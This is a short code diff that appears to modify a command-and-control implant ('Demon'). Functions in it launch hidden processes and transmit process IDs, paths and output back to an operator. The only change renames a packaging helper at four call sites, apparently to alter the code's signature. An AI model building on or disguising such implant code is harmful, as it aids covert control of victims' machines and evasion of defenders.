@@ -599,7 +599,7 @@ BOOL ProcessCreate(
     StartUpInfo.wShowWindow = SW_HIDE;
 
     Package = PackageCreate( DEMON_INFO );
-    PackageAddInt32( Package, DEMON_INFO_PROC_CREATE );
+    PkgAdIn32( Package, DEMON_INFO_PROC_CREATE );
 
     if ( Piped )
     {
@@ -740,7 +740,7 @@ BOOL ProcessCreate(
         if ( ! CmdLine )
         {
             PackageAddWString( Package, App );
-            PackageAddInt32( Package, ProcessInfo->dwProcessId );
+            PkgAdIn32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
         }
         else
@@ -760,7 +760,7 @@ BOOL ProcessCreate(
             PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );
 
             PackageAddWString( Package, s );
-            PackageAddInt32( Package, ProcessInfo->dwProcessId );
+            PkgAdIn32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
 
             DATA_FREE( s, x );
@@ -1421,7 +1421,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
 
     va_end( VaListArg );
 
-    PackageAddInt32( package, 0 ); // CALLBACK_OUTPUT
+    PkgAdIn32( package, 0 ); // CALLBACK_OUTPUT
     PackageAddBytes( package, CallbackOutput, CallbackSize );
     PackageTransmit( package );
 
